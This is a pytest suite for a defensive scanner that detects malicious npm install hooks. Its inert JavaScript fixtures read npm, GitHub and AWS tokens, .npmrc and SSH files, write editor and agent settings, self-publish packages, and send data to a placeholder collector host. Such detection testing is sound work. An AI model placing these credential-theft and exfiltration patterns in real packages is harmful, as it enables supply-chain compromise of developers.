"""Inert text only: no JavaScript, payload, credential or fixture is executed."""

import json

import pytest

from aurascan.analyzers.npm_lifecycle import inspect_npm_lifecycle
from aurascan.core.models import Phase, Severity


MANIFEST = "/captured/package/package.json"
ENTRY = "/captured/package/index.js"
HOSTS = ("collector.example.invalid",)
CRITICAL = "NPM-LIFECYCLE-SUPPLYCHAIN-001"
CREDENTIAL = "NPM-LIFECYCLE-CREDENTIAL-ACCESS-001"
PERSISTENCE = "NPM-LIFECYCLE-PERSISTENCE-001"
INCOMPLETE = "NPM-LIFECYCLE-INSPECTION-INCOMPLETE-001"


def inspect(text, command="bun run index.js", hook="preinstall", scripts=None):
    return inspect_npm_lifecycle(
        MANIFEST, json.dumps({"scripts": {hook: command}}),
        {ENTRY: text} if scripts is None else scripts, malicious_hosts=HOSTS,
    )


def ids(findings):
    return {finding.rule_id for finding in findings}


@pytest.mark.parametrize("command", ["bun run index.js", "bun run ./index.js", "bun index.js", "bun ./index.js", "node index.js", "node ./index.js"])
@pytest.mark.parametrize("hook", ["preinstall", "install", "postinstall", "prepare"])
def test_exact_lifecycle_and_active_confirmed_network_target(command, hook):
    findings = inspect("fetch('https://collector.example.invalid/inert');", command, hook)
    assert ids(findings) == {CRITICAL}
    finding = findings[0]
    assert finding.severity == Severity.CRITICAL
    assert finding.blocks_installation and not finding.requires_manual_review
    assert finding.phase == Phase.unpacked_source_scan
    assert finding.file_path == ENTRY and finding.line_number == 1
    assert "does not establish execution" in finding.explanation
    assert "campaign attribution" in finding.explanation
    assert "example.invalid" not in finding.evidence_snippet


def test_correlated_inert_credential_config_network_fixture():
    # Fake paths, empty configuration, and reserved test infrastructure only.
    # Python passes this as data; no JS runtime is invoked.
    text = """const fs = require('node:fs');
const fake = fs.readFileSync('/temporary/fake/.npmrc', 'utf8');
fs.writeFileSync('/temporary/fake/.claude/settings.json', '{}');
fetch('https://ordinary.example.invalid/inert');
"""
    finding = inspect(text)[0]
    assert finding.rule_id == CRITICAL
    assert finding.line_number == 2
    assert "credential access" in finding.evidence_snippet
    assert "editor or agent configuration write" in finding.evidence_snippet
    assert "outbound network call" in finding.evidence_snippet
    assert "fake" not in finding.evidence_snippet


@pytest.mark.parametrize("access", [
    "const fake = process.env.NPM_TOKEN;",
    "const fake = process.env['GITHUB_TOKEN'];",
    "const fake = process.env.AWS_SECRET_ACCESS_KEY;",
    "const fake = Object.entries(process.env);",
    "const fs = require('fs'); fs.readFileSync('/temporary/.npmrc');",
    "import fs from 'node:fs'; fs.readFileSync('/temporary/.aws/credentials');",
    "import * as fs from 'fs'; fs.readdirSync('/temporary/.ssh');",
    "import { readFileSync as read } from 'fs'; read('/temporary/.npmrc');",
    "const {readFileSync: read} = require('fs'); read('/temporary/.npmrc');",
    "const fs = require('fs/promises'); fs.readFile('/temporary/.npmrc');",
    "const fs = require('fs'); const path = require('path'); const os = require('os'); fs.readFileSync(path.join(os.homedir(), '.npmrc'));",
    "const fs = require('fs'); fs.readFileSync(process.env.HOME + '/.npmrc');",
])
def test_access_is_manual_review_without_exfiltration_or_execution_claim(access):
    findings = inspect(access)
    assert ids(findings) == {CREDENTIAL}
    assert findings[0].severity == Severity.HIGH
    assert not findings[0].blocks_installation and findings[0].requires_manual_review
    assert "theft or execution is not established" in findings[0].explanation


@pytest.mark.parametrize("text", [
    "console.log('NPM_TOKEN .npmrc .vscode/tasks.json');",
    "const documentation = \"fs.readFileSync('.npmrc'); fetch('https://collector.example.invalid');\";",
    "/* process.env.NPM_TOKEN; fetch('https://collector.example.invalid'); */",
    "// fetch('https://collector.example.invalid');\nconsole.log('ordinary build');",
    r"const pattern = /process.env.NPM_TOKEN|fetch\('https:\/\/collector.example.invalid'\)/;",
    "const fs = require('fs'); fs.readFileSync('.vscode/tasks.json');",
    "const fs = require('fs'); fs.writeFileSync('.vscode/tasks.json', '{}');",
    "const fs = require('fs'); fs.writeFileSync('settings.json', '{}'); fetch('https://ordinary.example.invalid');",
    "fetch('https://collector.example.invalid.evil.example.invalid');",
    "fetch('https://ordinary.example.invalid/collector.example.invalid');",
    "fetch('https://collector.example.invalid@ordinary.example.invalid');",
    "const data = 'https://collector.example.invalid';",
    "const fs = {}; fs.readFileSync('.npmrc');",
    "const process = {env: {NPM_TOKEN: 'fake'}}; console.log(process.env.NPM_TOKEN);",
    "const fetch = function () {}; fetch('https://collector.example.invalid');",
    "function fetch() {} fetch('https://collector.example.invalid');",
    "process.env.NPM_TOKEN = 'fake';",
    "delete process.env.NPM_TOKEN;",
    "typeof process.env.NPM_TOKEN;",
    "function unused() { fetch('https://collector.example.invalid'); }",
    "const unused = () => fetch('https://collector.example.invalid');",
    "const unused = () => { fetch('https://collector.example.invalid'); };",
    "const word = 'function'; const arrow = '=>';",
])
def test_comments_strings_regex_unused_helpers_and_benign_configuration_negative(text):
    assert inspect(text) == []


@pytest.mark.parametrize("command,hook", [
    ("echo bun run index.js", "preinstall"),
    ("bun run ../index.js", "preinstall"),
    ("bun run other/index.js", "preinstall"),
    ("node example.js", "preinstall"),
    ("bun run index.js", "test"),
    ("bun run index.js", "release"),
])
def test_other_entrypoints_and_non_lifecycle_commands_are_not_correlated(command, hook):
    assert inspect("fetch('https://collector.example.invalid');", command, hook) == []


def test_other_package_and_unreachable_sibling_never_supply_signals():
    captured = {
        ENTRY: "console.log('ordinary initialization');",
        "/captured/package/unused.js": "fetch('https://collector.example.invalid');",
        "/captured/another/index.js": "fetch('https://collector.example.invalid');",
    }
    assert inspect("", scripts=captured) == []
    del captured[ENTRY]
    assert ids(inspect("", scripts=captured)) == {INCOMPLETE}


@pytest.mark.parametrize("destination", [".vscode/tasks.json", "./.claude/settings.json"])
def test_config_write_with_outbound_network_requests_review(destination):
    text = "const fs = require('fs'); fs.writeFileSync(" + json.dumps(destination) + ", '{}'); fetch('https://ordinary.example.invalid');"
    findings = inspect(text)
    assert ids(findings) == {PERSISTENCE}
    assert not findings[0].blocks_installation and findings[0].requires_manual_review


def test_credential_and_network_alone_do_not_claim_supplychain_worm():
    assert ids(inspect("const fake = process.env.NPM_TOKEN; fetch('https://ordinary.example.invalid');")) == {CREDENTIAL}


def test_literal_manifest_mutation_and_publish_with_credential_access():
    text = """const fs = require('fs');
const cp = require('child_process');
const fake = process.env.NPM_TOKEN;
fs.writeFileSync('package.json', '{}');
cp.execFileSync('npm', ['publish']);
"""
    assert ids(inspect(text)) == {CRITICAL}
    assert ids(inspect(text.replace("['publish']", "['--version']"))) == {CREDENTIAL}
    assert ids(inspect(text.replace("'package.json'", "'test-package.json'"))) == {CREDENTIAL}


def test_helper_requires_actual_local_invocation():
    text = "function initialize() { fetch('https://collector.example.invalid'); }"
    assert inspect(text) == []
    assert ids(inspect(text + " initialize();")) == {CRITICAL}
    assert ids(inspect("(function () { fetch('https://collector.example.invalid'); })();")) == {CRITICAL}


def test_helper_parameters_are_unresolved_coverage_not_invented_flow():
    text = "function initialize(destination) { fetch(destination); } initialize('https://collector.example.invalid');"
    findings = inspect(text)
    assert ids(findings) == {INCOMPLETE}
    assert findings[0].blocks_installation


@pytest.mark.parametrize("text", [
    "const broken = 'unterminated;",
    "/* unterminated comment",
    "fetch('https://collector.example.invalid';",
    "const dynamic = `inert ${value}`;",
    "(" * 65 + ")" * 65,
    " " * (1024 * 1024 + 1),
])
def test_malformed_and_bounded_subset_failures_are_coverage(text):
    findings = inspect(text)
    assert ids(findings) == {INCOMPLETE}
    assert findings[0].blocks_installation
    assert "malicious" not in findings[0].explanation


def test_strict_manifest_and_missing_captured_entry_fail_closed():
    findings = inspect_npm_lifecycle(MANIFEST, '{"scripts": {}, "scripts": {}}', {}, malicious_hosts=HOSTS)
    assert ids(findings) == {INCOMPLETE}
    assert ids(inspect("", scripts={})) == {INCOMPLETE}
    assert inspect("console.log('ordinary initialization');") == []


def test_strings_and_credential_values_never_enter_evidence():
    private = "FAKE_SECRET_DO_NOT_PRINT_12345"
    text = "const fake = process.env.NPM_TOKEN; fetch('https://collector.example.invalid/?key=" + private + "');"
    result = inspect(text)[0].to_dict()
    for key in ("evidence_snippet", "explanation", "recommendation", "false_positive_notes"):
        assert private not in result[key]
        assert "https://" not in result[key]


def test_reassigned_import_or_string_constant_is_not_a_supported_active_target():
    assert inspect("let fs = require('fs'); fs = {}; fs.readFileSync('.npmrc');") == []
    assert inspect("let destination = 'https://collector.example.invalid'; destination = 'https://ordinary.example.invalid'; fetch(destination);") == []


def test_nested_function_names_do_not_leak_into_another_scope():
    text = "function unused() { function initialize() { fetch('https://collector.example.invalid'); } } initialize();"
    assert inspect(text) == []


def test_builtin_shadowing_before_declaration_does_not_invent_network_or_credentials():
    assert inspect("fetch('https://collector.example.invalid'); const fetch = function () {};") == []
    assert inspect("const fake = process.env.NPM_TOKEN; const process = {env: {}};") == []


def test_replaced_fs_method_is_coverage_without_credential_claim():
    findings = inspect("const fs = require('fs'); fs.readFileSync = function () {}; fs.readFileSync('.npmrc');")
    assert ids(findings) == {INCOMPLETE}


def test_http_alias_and_literal_url_composition_remain_supported():
    assert ids(inspect("const https = require('node:https'); const endpoint = 'https://' + 'collector.example.invalid' + '/inert'; https.request(endpoint);")) == {CRITICAL}


def test_fs_destination_must_be_write_argument_not_source_or_data():
    prefix = "const fs = require('fs'); fetch('https://ordinary.example.invalid'); "
    assert inspect(prefix + "fs.copyFileSync('.vscode/tasks.json', 'copy.json');") == []
    assert inspect(prefix + "fs.writeFileSync('ordinary.json', '.vscode/tasks.json');") == []
    assert ids(inspect(prefix + "fs.copyFileSync('empty.json', '.vscode/tasks.json');")) == {PERSISTENCE}


def test_token_and_expression_bounds_are_coverage(monkeypatch):
    import aurascan.analyzers.npm_lifecycle as lifecycle
    monkeypatch.setattr(lifecycle, "_MAX_TOKENS", 12)
    assert ids(inspect("console.log('inert');" * 5)) == {INCOMPLETE}
    monkeypatch.setattr(lifecycle, "_MAX_TOKENS", 65536)
    monkeypatch.setattr(lifecycle, "_MAX_EXPRESSION_TOKENS", 8)
    assert ids(inspect("const data = a + b + c + d + e + f + g;")) == {INCOMPLETE}


@pytest.mark.parametrize("prefix", ["const value = ordinary + ", "const value = ordinary && ", "if (ordinary) ", "const value = ordinary ? /inert/ : "])
def test_regex_data_after_expression_operators_or_control_is_not_code(prefix):
    assert inspect(prefix + r"/fetch('https:\/\/collector.example.invalid')|process.env.NPM_TOKEN/;") == []
